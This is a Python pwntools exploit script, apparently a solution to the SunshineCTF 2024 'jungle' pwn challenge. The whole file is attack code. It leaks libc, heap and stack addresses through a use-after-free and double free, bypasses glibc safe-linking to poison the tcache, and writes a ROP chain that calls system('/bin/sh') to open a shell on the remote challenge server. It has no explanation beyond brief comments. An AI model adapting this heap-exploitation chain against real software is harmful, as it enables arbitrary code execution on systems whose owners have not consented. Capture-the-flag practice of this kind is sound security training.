#!/usr/bin/env python3
from pwn import *

# =========================================================
#                          SETUP                         
# =========================================================
exe = './jungle.bin_patched'
elf = context.binary = ELF(exe, checksec=True)
libc = './libc.so.6'
libc = ELF(libc, checksec=False)
context.log_level = 'debug'
context.terminal = ["tmux", "splitw", "-h", "-p", "65"]
host, port = '2024.sunshinectf.games', 24005

def initialize(argv=[]):
    if args.GDB:
        return gdb.debug([exe] + argv, gdbscript=gdbscript)
    elif args.REMOTE:
        return remote(host, port)
    else:
        return process([exe] + argv)

gdbscript = '''
init-pwndbg

breakrva 0x01c61
'''.format(**locals())

# =========================================================
#                         EXPLOITS
# =========================================================
# └──╼ [★]$ pwn checksec jungle.bin 
#     Arch:     amd64-64-little
#     RELRO:    Full RELRO
#     Stack:    Canary found
#     NX:       NX enabled
#     PIE:      PIE enabled
def use(idx):
    io.sendlineafter(b'>>>', b'1')
    io.sendlineafter(b'>>>', str(idx).encode())

def add(idx, name):
    io.sendlineafter(b'>>>', b'2')
    io.sendlineafter(b'>>>', str(idx).encode())
    io.sendafter(b'>>>', name)

def remove(idx):
    io.sendlineafter(b'>>>', b'3')
    io.sendlineafter(b'>>>', str(idx).encode())

def demangle(val):
    mask = 0xfff << 52
    while mask:
        v = val & mask
        val ^= (v >> 12)
        mask >>= 12
    return val

def mangle(heap_addr, val):
    return (heap_addr >> 12) ^ val

def exploit():
    global io
    io = initialize()

    add(1, b'Genie') # to leak
    use(1)
    io.recvuntil(b'point: 0x')
    libc.address = int(io.recvline().strip(), 16) - libc.sym['printf']
    remove(2)
    remove(3)

    remove(1)
    remove(1)
    use(1)
    io.recvuntil(b'<<< The ')
    heap = u64(io.recvuntil(b' isn\'t', drop=True).strip().ljust(8, b'\x00'))
    heap = demangle(heap) - 0x340
    add(1, p64(mangle(heap, libc.sym['environ']-24)))
    add(2, b'idk')
    add(3, b'A'*23+b'B')

    use(3)
    io.recvuntil(b'AB')
    io.recvuntil(b'AB')
    stack = u64(io.recvuntil(b' isn\'t', drop=True).strip().ljust(8, b'\x00'))
    rip = stack - 0x140

    remove(4)
    remove(5)
    remove(1)
    remove(1)
    add(1, p64(mangle(heap, rip-0x8)))
    add(4, b'idk')

    rop = ROP(libc)
    POP_RDI = rop.find_gadget(['pop rdi', 'ret'])[0]
    RET = rop.find_gadget(['ret'])[0]
    payload = flat([
        stack,
        POP_RDI,
        next(libc.search(b'/bin/sh\x00')),
        RET,
        libc.sym['system'],
    ])
    add(5, payload)

    # consume remaining to return
    for i in range(25-19+1):
        io.sendlineafter(b'>>>', b'77')

    log.info('libc base: %#x', libc.address)
    log.info('heap base: %#x', heap)
    log.info('stack: %#x', stack)   
    io.interactive()
    
if __name__ == '__main__':
    exploit()
